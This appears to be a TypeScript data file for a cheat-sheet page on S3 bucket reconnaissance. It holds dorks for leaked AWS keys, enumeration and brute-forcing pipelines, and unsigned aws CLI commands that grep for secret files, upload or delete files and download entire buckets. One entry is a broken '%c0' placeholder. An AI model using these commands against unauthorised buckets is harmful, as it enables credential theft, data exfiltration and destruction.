export interface S3BucketCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-28"
export const pageDescription = "S3 bucket reconnaissance — finding exposed AWS buckets, enumeration, brute-forcing, and exploitation."

export const s3BucketCategories: S3BucketCategory[] = [
  {
    category: "Introduction",
    commands: [
      {
        command: "S3 bucket reconnaissance refers to identifying and investigating publicly accessible or misconfigured AWS S3 buckets",
        description: "Overview of S3 bucket recon techniques",
      },
    ],
  },
  {
    category: "Manual Methods for Identifying S3 Buckets",
    commands: [
      {
        command: "%c0",
        description: "Check if site is hosted on AWS via URL bar",
      },
    ],
  },
  {
    category: "Google Dorking for AWS S3 Buckets",
    commands: [
      {
        command: 'site:s3.amazonaws.com "target.com"',
        description: "Find S3 buckets for a specific domain",
      },
      {
        command: 'site:*.s3.amazonaws.com "target.com"',
        description: "Find S3 subdomains for a target",
      },
      {
        command: "site:s3.amazonaws.com intitle:\"index of\"",
        description: "Find open bucket listings",
      },
      {
        command: 'site:s3.amazonaws.com intitle:"index of" "bucket"',
        description: "Find bucket listings with directory index",
      },
      {
        command: "(site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) \"target.com\"",
        description: "Comprehensive S3 dork across regions",
      },
    ],
  },
  {
    category: "Automation Tools for S3 Enumeration",
    commands: [
      {
        command: "subfinder -d target.com -all -silent | httpx-toolkit -sc -title -td | grep 'Amazon S3'",
        description: "Find S3 buckets with subfinder + httpx",
      },
      {
        command: "subfinder -d target.com -all -silent | nuclei -t /home/coffinxp/.local/nuclei-templates/http/technologies/s3-detect.yaml",
        description: "Mass S3 detection with Nuclei",
      },
    ],
  },
  {
    category: "Extracting S3 URLs from JavaScript Files",
    commands: [
      {
        command: 'katana -u https://site.com/ -d 5 -jc | grep \'\.js$\' | tee alljs.txt',
        description: "Crawl and collect JS file URLs",
      },
      {
        command: 'cat alljs.txt | xargs -I {} curl -s {} | grep -oE \'http[s]?://[^"]*\\.s3\\.amazonaws\\.com[^" ]*\' | sort -u',
        description: "Extract S3 URLs from JS files",
      },
      {
        command: "subfinder -d target.com -all -silent | httpx-toolkit -o file.txt",
        description: "Generate subdomain list",
      },
      {
        command: "cat file.txt | grep -oP '(?<=https?://).*' >input.txt",
        description: "Clean URLs to input format",
      },
      {
        command: "python java2s3.py input.txt target.com output.txt",
        description: "Extract S3 URLs from JS files",
      },
      {
        command: 'cat output.txt | grep -oP "https?://[a-zA-Z0-9.-]*s3(\\.dualstack)?\\.ap-[a-z0-9-]+\\.amazonaws\\.com/[^\\s\"<>]+" | sort -u',
        description: "Extract unique S3 URLs",
      },
    ],
  },
  {
    category: "Brute-Forcing S3 Bucket Names",
    commands: [
      {
        command: "ruby lazys3.rb <COMPANY>",
        description: "Brute-force S3 bucket names",
      },
      {
        command: "cewl https://site.com/ -d 3 -w file.txt",
        description: "Generate custom wordlist from target",
      },
      {
        command: "s3scanner -bucket-file file.txt -enumerate -threads 10 | grep -aE 'AllUsers: \\[.*(READ|WRITE|FULL).*\\]'",
        description: "Scan and filter public buckets",
      },
    ],
  },
  {
    category: "GitHub & OSINT Discovery",
    commands: [
      {
        command: 'org:target "amazonaws"',
        description: "GitHub dork for AWS references",
      },
      {
        command: 'org:target "aws_access_key"',
        description: "GitHub dork for AWS access keys",
      },
      {
        command: 'org:target "aws_secret_key"',
        description: "GitHub dork for AWS secret keys",
      },
      {
        command: 'org:target "S3_BUCKET"',
        description: "GitHub dork for S3 bucket references",
      },
    ],
  },
  {
    category: "AWS S3 Bucket Listing & File Management",
    commands: [
      {
        command: "aws s3 ls s3://[bucketname] --no-sign-request",
        description: "List bucket contents without signing",
      },
      {
        command: "aws s3 ls s3://[bucketname] --no-sign-request --recursive --human-readable",
        description: "Recursive listing in human-readable format",
      },
      {
        command: "aws s3 ls s3://[bucketname] --no-sign-request --recursive | grep -E '\\.env|\\.pem|\\.key|\\.json|\\.yml|\\.yaml|\\.config|config\\.php|\\.ini|\\.sql|\\.db|\\.log|\\.backup'",
        description: "Find sensitive file types",
      },
      {
        command: "aws s3 cp file.txt s3://[bucketname] --no-sign-request",
        description: "Upload a file to the bucket",
      },
      {
        command: "aws s3 rm s3://[bucketname]/file.txt --no-sign-request",
        description: "Delete a file from the bucket",
      },
      {
        command: "aws s3 cp s3://[bucketname]/ ./ --recursive --no-sign-request",
        description: "Download entire bucket contents",
      },
    ],
  },
]
